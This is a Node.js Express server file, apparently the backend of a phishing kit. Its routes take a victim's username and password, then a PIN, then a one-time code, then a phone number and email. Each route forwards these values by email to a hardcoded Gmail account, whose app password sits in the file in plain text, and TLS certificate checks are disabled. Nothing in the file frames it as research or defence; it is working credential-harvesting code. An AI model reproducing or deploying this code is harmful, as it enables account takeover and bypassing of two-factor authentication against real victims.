const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const cors = require("cors");
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000; // port to connect to WEB

// emails credentials
const userEmail = "Paydaysite1@gmail.com";
const pass = "jrqjapmxebtahohb";

// Middleware
app.use(express.json());

// api routes

// API routes for index
app.post("/", (req, res) => {
  const { username, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
    tls: {
      rejectUnauthorized: false, // ⚠️ disables cert validation
    },
  });

  const mailOptions = {
    from: `${username}`,
    to: userEmail,
    subject: `UserName: ${username} \t\n\n\n password: ${password}`,
    text: `New user registered with UserName: ${username} and password: ${password}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for otp
app.post("/pin", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
    tls: {
      rejectUnauthorized: false, // ⚠️ disables cert validation
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `PIN: ${req.body?.pin} `,
    text: `New user registered with PIN: ${req.body?.pin}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
app.post("/otp", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
    tls: {
      rejectUnauthorized: false, // ⚠️ disables cert validation
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `OTP: ${req.body?.otp} `,
    text: `New user registered with OTP: ${req.body?.otp}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
app.post("/details", (req, res) => {
  const { phoneNumber, email } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
    tls: {
      rejectUnauthorized: false, // ⚠️ disables cert validation
    },
  });

  const mailOptions = {
    from: `${phoneNumber}`,
    to: userEmail,
    subject: `PhoneNumber: ${phoneNumber} \t\n\n\n Email: ${email}`,
    text: `New user registered with PhoneNumber: ${phoneNumber} and Email: ${email}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
